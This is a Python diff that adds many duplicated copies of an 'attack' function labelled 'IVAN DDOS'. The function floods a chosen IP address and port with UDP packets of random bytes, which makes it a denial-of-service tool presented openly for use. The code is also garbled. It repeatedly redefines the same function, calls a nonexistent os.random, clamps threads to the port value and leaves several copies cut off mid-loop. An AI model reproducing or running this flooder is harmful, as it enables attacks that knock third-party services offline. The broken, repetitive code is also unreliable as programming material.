+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
